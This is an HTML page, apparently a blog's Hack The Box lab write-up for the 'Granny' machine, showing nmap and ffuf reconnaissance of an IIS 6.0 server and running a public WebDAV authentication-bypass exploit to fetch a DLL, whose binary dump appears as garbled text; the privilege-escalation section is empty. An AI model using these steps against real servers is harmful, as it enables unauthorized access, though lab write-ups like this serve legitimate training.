@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Granny :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Steps Reconnaissance NMAP ┌──(kali㉿kali)-[~/Documents/hackthebox/granny] └─$ nmap -p- -sV 10.10.10.15 -oN nmapAll.txt Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 03:48 EDT Nmap scan report for 10.10.10.15 Host is up (0.024s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 110." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/granny-write-up/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Granny :: Research blog">
+<meta property="og:description" content="Hack The Box machine" />
+<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/granny-write-up/" />
+<meta property="og:site_name" content="Granny" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/hackthebox/granny-write-up/">Granny</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-09 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Granny" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="steps">Steps<a href="#steps" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="reconnaissance">Reconnaissance<a href="#reconnaissance" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="nmap">NMAP<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/granny<span style="color:#f92672">]</span>
+└─$ nmap -p- -sV 10.10.10.15 -oN nmapAll.txt                                                       
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-03-29 03:48 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.15
+Host is up <span style="color:#f92672">(</span>0.024s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65534</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 110.19 seconds
+
+</code></pre></div><h3 id="iis-version">IIS version<a href="#iis-version" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/granny<span style="color:#f92672">]</span>
+└─$ nmap -sV -A -p <span style="color:#ae81ff">80</span> 10.10.10.15           
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-03-29 03:53 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.15
+Host is up <span style="color:#f92672">(</span>0.027s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-webdav-scan: 
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   WebDAV type: Unknown
+|   Server Date: Tue, <span style="color:#ae81ff">29</span> Mar <span style="color:#ae81ff">2022</span> 07:53:34 GMT
+|_  Server Type: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-methods: 
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+|_http-server-header: Microsoft-IIS/6.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 8.12 seconds
+</code></pre></div><h2 id="ffuf">Ffuf<a href="#ffuf" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<pre tabindex="0"><code class="language-┌──(kali㉿kali)-[~/Documents/hackthebox/granny]" data-lang="┌──(kali㉿kali)-[~/Documents/hackthebox/granny]">└─$ ffuf -u http://10.10.10.15/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .asp            
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.15/FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
+ :: Extensions       : .asp 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+images                  [Status: 301, Size: 149, Words: 9, Lines: 2]
+_private                [Status: 301, Size: 153, Words: 9, Lines: 2]
+aspnet_client           [Status: 301, Size: 158, Words: 9, Lines: 2]
+_vti_log                [Status: 301, Size: 155, Words: 9, Lines: 2]
+_vti_bin                [Status: 301, Size: 155, Words: 9, Lines: 2]
+</code></pre><h2 id="web-server">Web server<a href="#web-server" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://10.10.10.15/_vti_bin/_vti_adm/fpadmdll.dll
+</code></pre></div><p>Looks like this file requires authentication</p>
+<p><img src="/images/auth.png" alt="auth"></p>
+<p>Looking at common vulnerabilities for IIS 6.0, there are a few authentication bypasses. It would be interesting to see if these work.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Microsoft IIS 6.0 - <span style="color:#e6db74">&#39;/AUX / &#39;</span>.aspx<span style="color:#e6db74">&#39; Remote Denial of Service                                             | windows/dos/3965.pl
+</span><span style="color:#e6db74">Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                   | windows/dos/15167.txt
+</span><span style="color:#e6db74">Microsoft IIS 6.0 - WebDAV &#39;</span>ScStoragePathFromUrl<span style="color:#960050;background-color:#1e0010">&#39;</span> Remote Buffer Overflow                                 | windows/remote/41738.py
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                  | windows/remote/8765.php
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                              | windows/remote/8704.txt
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                              | windows/remote/8806.pl
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass <span style="color:#f92672">(</span>Patch<span style="color:#f92672">)</span>                                          | windows/remote/8754.patch
+Microsoft IIS 6.0/7.5 <span style="color:#f92672">(</span>+ PHP<span style="color:#f92672">)</span> - Multiple Vulnerabilities                                                 | windows/remote/19033.txt
+
+</code></pre></div><h3 id="authentication-bypass">Authentication bypass<a href="#authentication-bypass" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/granny<span style="color:#f92672">]</span>
+└─$ ./8806.pl 10.10.10.15 /_vti_bin/_vti_adm/fpadmdll.dll          
+write <span style="color:#e6db74">&#39;help&#39;</span> <span style="color:#66d9ef">for</span> get help list
+$&gt; help
+
+                - OPTIONS -
+
+
+        help            give this help list
+        source          get file content
+        path            get directory contents
+        put             put file
+        quit            exit exploit
+
+</code></pre></div><p>Looks as though we can view the contents of the dll that we were unable to see or execute before!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/granny<span style="color:#f92672">]</span>                                                                                            
+└─$ ./8806.pl 10.10.10.15 /_vti_bin/_vti_adm/fpadmdll.dll                                                                            <span style="color:#ae81ff">141</span> ⨯ 
+write <span style="color:#e6db74">&#39;help&#39;</span> <span style="color:#66d9ef">for</span> get help list                                                                                                             
+$&gt; source                                                            
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK                                                                                                                            
+Connection: close
+Date: Tue, <span style="color:#ae81ff">29</span> Mar <span style="color:#ae81ff">2022</span> 11:09:12 GMT
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Content-Type: application/x-msdownload
+Content-Length: <span style="color:#ae81ff">27336</span>
+ETag: <span style="color:#e6db74">&#34;0e0b8505453c71:392&#34;</span>
+Last-Modified: Sun, <span style="color:#ae81ff">18</span> Feb <span style="color:#ae81ff">2007</span> 12:00:00 GMT
+Accept-Ranges: bytes
+
+MZ@     !L!This program cannot be run in DOS mode.
+$oDY+*
++*
++*
+++
+$*
+.
+<span style="color:#f92672">(</span>*
+  
+.*
+!
+<span style="color:#f92672">)</span>*
+.
+**
++*
+$*
+Rich+*
+PELNbC!
+       0a PP0P@ph.text
+                       <span style="color:#e6db74">`</span>.data  @.rsrc00@@.reloc@@@B0~P4ndX* 
+                                                            NbCG*-*-* :-| :^| :-/ :-<span style="color:#f92672">(</span> 8-<span style="color:#f92672">(</span> *-*-*200 OKcontent-type: text/html
+content-length: <span style="color:#ae81ff">15</span>
+
+Server too busyVfpadmdllHttpExtensionProcQueueRequestInitThreadPoolMicrosoft FrontPage Server Extensionsfp5Autl.dll<span style="color:#ae81ff">\{</span>F8119364-D2DA-11D3-863
+1-005004838609<span style="color:#f92672">}</span>binbin<span style="color:#ae81ff">\L</span>ocationSOFTWARE<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\S</span>hared Tools<span style="color:#ae81ff">\W</span>eb Server Extensions<span style="color:#ae81ff">\5</span>.0MsiGetComponentPathAMsiGetProductCodeAmsi.dllCannot 
+load DLL <span style="color:#e6db74">&#39;%s&#39;</span>.
+fp5Awel.dllCloseThreadPool%-15s  Version: %d.%d.%d.%d
+                      At: %s
+                      OS: %s
+NB10NbCF:<span style="color:#ae81ff">\o</span>ffice<span style="color:#ae81ff">\f</span>p<span style="color:#ae81ff">\s</span>erver<span style="color:#ae81ff">\s</span>ource<span style="color:#ae81ff">\f</span>padmdll<span style="color:#ae81ff">\w</span>innt<span style="color:#ae81ff">\f</span>padmdll.pdbt$| YËD$SVWhh0P<span style="color:#f92672">(</span>t uu<span style="color:#f92672">[</span>5$h 5t ֋tBh5t օ t,x uh5x օ| tӅu
+                                                                                                                  WY3jX_^<span style="color:#f92672">[</span>UVXWVt<span style="color:#e6db74">&#34;hQP t
+</span><span style="color:#e6db74">                                                                                                                                      jPjj׋
+</span><span style="color:#e6db74">_^U
+</span><span style="color:#e6db74">   S39VW=TUMt2j\XY;YtVP\
+</span><span style="color:#e6db74">                        8]u9]
+</span><span style="color:#e6db74">                             u*h]8tVhdP׃
+</span><span style="color:#e6db74">                                        VuP׃
+</span><span style="color:#e6db74">                                            ]P;u
+</span><span style="color:#e6db74">M;t3_^U8SVWMh&#39;E5</span>$hP<span style="color:#e6db74">֋huօۉEt     tj^3EtDEPuӋt2EPWuEPUt    t3j^j\WXYYt u&#39;EP3hVhhEPEVPV5Suօu}uy}wpEPEWPjSu֋t&#39;TWYr&gt;hCPYYu C*t
+</span><span style="color:#e6db74">
+</span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
